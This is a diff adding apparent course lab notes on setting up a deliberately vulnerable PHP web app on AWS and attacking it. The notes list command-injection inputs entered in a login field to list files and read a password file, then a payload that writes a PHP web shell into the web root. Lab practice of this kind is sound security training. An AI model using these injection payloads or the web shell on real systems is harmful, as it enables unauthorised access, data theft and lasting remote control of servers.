@@ -141,3 +141,54 @@ Quiz
 5) Solution 4
 
 
+AWS
+
+---> create instance with 
+ CS5910 coursera 'a' AMI im community AMI
+
+---> edit http https with my id
+---> select 1a subnet
+---> open the public address
+
+COMMANDS 
+
+sudo yum update
+mkdir proj
+cd proj
+
+wget http://ciast.uccs.edu/coursera/pub/csr591.tbz
+
+tar jxf csr591.tbz
+
+sudo cp -r www /var/
+cd /var/www/html
+sudo chown -R apache:apache midterm gsc stduentproj
+sudo chmod -R 755 midterm gsc student proj
+
+execute http://ip//midterm.php
+
+sudo chmod 755 /var/www/data/*.txt
+sudo chmod 755 /var/www/data/*.csv
+
+execute http://ip//upload.php
+execute http://ip//keyaccess.html
+
+---> in key access html 
+enter the command in login field
+
+csnet&ls&
+csnet&cat passwd&
+--> go to login and add jupchurc
+
+now go to keyaccess.html
+
+csnet&ls -al ../html&
+
+csnet&ls -l&
+
+csnet&ls -al&
+
+csnet&cat vulpy.txt&
+
+
+csnet& echo'<?php passthru($_GET[cmd]); ?>' > ../html/midterm/sh6.php &
